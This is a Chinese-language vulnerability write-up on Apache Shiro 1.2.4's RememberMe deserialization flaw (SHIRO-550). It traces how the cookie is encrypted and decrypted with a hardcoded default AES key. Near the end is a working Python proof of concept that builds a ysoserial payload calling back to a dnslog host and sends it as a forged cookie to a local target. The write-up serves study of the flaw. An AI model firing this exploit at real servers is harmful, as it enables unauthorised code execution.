<hr>
<h2 id="title-Apache-Shiro-1-2-4反序列化漏洞date-2020-08-31-14-37-52tags">title: Apache Shiro 1.2.4反序列化漏洞<br>
date: 2020-08-31 14:37:52<br>
tags:</h2>
<h2 id="漏洞简介">漏洞简介</h2>
<p>Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>
Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为 RememberMe 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
<p><a href="https://issues.apache.org/jira/browse/SHIRO-550">SHIRO-550</a><br>
<img src="20200901150608.png" alt=""><br>
在识别身份的时候，需要对 Cookie 里的 RememberMe 字段解密,解密的顺序为：</p>
<ul>
<li>检索cookie中RememberMe的值</li>
<li>Base64解码</li>
<li>使用AES解密</li>
<li>反序列化</li>
</ul>
<p>但是，AES 加密的秘钥被硬编码在代码里，每个人通过源代码都可以拿到 AES 加密的密钥。所以当攻击者将恶意的 payload 进行序列化、AES 加密、base64 编码，作为 Cookie 的 RememberMe 字段发送。Shiro 将 RememberMe 进行解密并且反序列化，最终造成反序列化漏洞。</p>
<h2 id="漏洞分析">漏洞分析</h2>
<p>获取 Apache Shiro 存在漏洞的源代码</p>
<pre><code class="language-shell">git clone https://github.com/apache/shiro.git    
cd shiro  
git checkout shiro-root-1.2.4
</code></pre>
<p>修改 /shiro/samples/web/pom.xml</p>
<pre><code class="language-xml">&lt;dependency&gt;
    &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
    &lt;artifactId&gt;jstl&lt;/artifactId&gt;
    &lt;version&gt;1.2&lt;/version&gt;
    &lt;scope&gt;runtime&lt;/scope&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;taglibs&lt;/groupId&gt;
    &lt;artifactId&gt;standard&lt;/artifactId&gt;
    &lt;version&gt;1.1.2&lt;/version&gt;
    &lt;scope&gt;runtime&lt;/scope&gt;
&lt;/dependency&gt;
</code></pre>
<p>然后用idea导入mvn项目<br>
<img src="20200831152913.png" alt=""></p>
<p>设置run/debug configurations， 添加本地tomcat环境<br>
<img src="20200831162735.png" alt=""></p>
<p><img src="20200831163009.png" alt=""></p>
<p>在 <code>org.apache.shiro.mgt.RememberMeManager#onSuccessfulLogin</code> 处添加断点，然后debug 开启 tomcat 服务<br>
<img src="20200831172519.png" alt=""></p>
<p><img src="20200831173036.png" alt=""></p>
<h3 id="加密过程">加密过程</h3>
<p>登录账户root/secret，勾选上Remember Me的按钮，程序会停在断点处，用户名和密码也会存储在 token 中<br>
<img src="20200901110408.png" alt=""><br>
forgetIdentity 针对 subject 变量进行处理，跟进 forgetIdentity 方法<br>
<code>org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.Subject)</code><br>
<img src="20200901160011.png" alt=""></p>
<p>调用 forgetIdentity 构造方法处理 request 和 reponse 请求<br>
<code>org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)</code><br>
<img src="20200901160152.png" alt=""></p>
<p>跟进 removeFrom 方法，在 response 响应头中加入了一些cookie信息。<br>
<code>org.apache.shiro.web.servlet.SimpleCookie#removeFrom</code><br>
<img src="20200901160701.png" alt=""></p>
<p>回到 onSuccessfulLogin<br>
<img src="20200901161139.png" alt=""></p>
<p>调用 rememberIdentity 生成 cookie 中的 remember 字段。跟进 rememberIdentity 方法。<br>
<code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.authc.AuthenticationToken, org.apache.shiro.authc.AuthenticationInfo)</code><br>
<img src="20200901110834.png" alt=""></p>
<p>通过 getIdentityToRemember 获取用户的身份，继续跟进 rememberIdentity 方法。<br>
<code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.subject.PrincipalCollection)</code><br>
<img src="20200901113024.png" alt=""></p>
<p>调用 convertPrincipalsToBytes 方法将 accountPrincipals &lt;“root”&gt; 转换为字节形式，跟进 convertPrincipalsToBytes 方法。<br>
<code>org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes</code><br>
<img src="20200901113616.png" alt=""></p>
<p>转换过程中首先对用户的 id 进行序列化，然后利用 encrypt 进行加密。<br>
<code>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</code><br>
<img src="20200901114502.png" alt=""></p>
<p>加密的密钥由getEncryptionCipherKey()得到<br>
<img src="20200901161804.png" alt=""></p>
<p>getEncryptionCipherKey 实际上是开头中的 DEFAULT_CIPHER_KEY_BYTES 的常量  <code>kPH+bIxk5D2deZiIxcaaaA==</code></p>
<p>继续单步执行，返回 rememberIdentity 函数<br>
<img src="20200901120950.png" alt=""></p>
<p>跟进函数 rememberSerializedIdentity <code>org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity</code><br>
<img src="20200901121229.png" alt=""><br>
对值进行 base64 编码之后，设置到 cookie 中。</p>
<p>当我们勾选 RememberMe 选项框之后，点击登陆之后，后端会进行如下操作。</p>
<ul>
<li>序列化用户 id</li>
<li>对用户 id 进行 AES 加密，密钥为常量</li>
<li>base64 编码</li>
<li>设置到 cookie 中的 rememberme 字段</li>
</ul>
<p><img src="20200901124515.png" alt=""></p>
<h3 id="解密过程">解密过程</h3>
<p>在 <code>org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</code> 添加断点，然后发送一个带有 readmemberMe  cookie的请求。<br>
<img src="20200901164444.png" alt=""></p>
<p>跟进函数 getRememberedPrincipals<br>
<code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code><br>
<img src="20200901165422.png" alt=""></p>
<p>调用 getRememberedSerializedIdentity 针对http请求进行处理，跟进 getRememberedSerializedIdentity<br>
<code> org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code><br>
<img src="20200901170053.png" alt=""></p>
<p>getCookie 构造方法先获取 cookie 信息,readValue 方法，根据 Cookie 中的 name 字段获取 Cookie 的值，然后返回 Cookie 的值<br>
<img src="20200901170622.png" alt=""></p>
<p>然后调用 <code>byte[] decoded = Base64.decode(base64)</code>处理 base64 加密的 Cookie 信息，并且将这个 Cookie 转化为二进制字节码<br>
<img src="20200901170847.png" alt=""></p>
<p>回到 getRememberedPrincipals，继续跟进 convertBytesToPrincipals 函数<br>
<code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</code><br>
<img src="20200901171410.png" alt=""></p>
<p>AES 解密  <code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code><br>
<img src="20200901171905.png" alt=""></p>
<p>反序列化 <code>org.apache.shiro.mgt.AbstractRememberMeManager#deserialize</code><br>
<img src="20200902114203.png" alt=""><br>
<code>org.apache.shiro.io.DefaultSerializer#deserialize</code><br>
<img src="20200902114258.png" alt=""><br>
看到 <code>readObject()</code></p>
<p>当我们发送带有 readmemberMe  cookie的请求，后端会进行如下操作。</p>
<ul>
<li>读取 cookie 中 rememberMe 的值</li>
<li>base64 解码</li>
<li>进行 AES 解密，密钥为常量</li>
<li>反序列化</li>
</ul>
<pre><code class="language-python">#!/usr/bin/env python3
# coding:utf-8

from Crypto.Cipher import AES
import traceback
import requests
import subprocess
import uuid
import base64

target = &quot;http://localhost:8080/samples_web_war/&quot;
jar_file = 'F:\\Penetration\\ysoserial\\ysoserial-0.0.6-SNAPSHOT-all.jar'
cipher_key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;

# 创建 rememberme的值
popen = subprocess.Popen(['java','-jar',jar_file, &quot;URLDNS&quot;, &quot;http://7zhfmm.dnslog.cn&quot;],
                        stdout=subprocess.PIPE)
BS = AES.block_size
pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
mode = AES.MODE_CBC
iv = uuid.uuid4().bytes
encryptor = AES.new(base64.b64decode(cipher_key), mode, iv)
file_body = pad(popen.stdout.read())
base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))

# 发送request
try:
    r = requests.get(target, cookies={'rememberMe':base64_ciphertext.decode()}, timeout=10)
except:
    traceback.print_exc()
</code></pre>
<h2 id="漏洞利用">漏洞利用</h2>
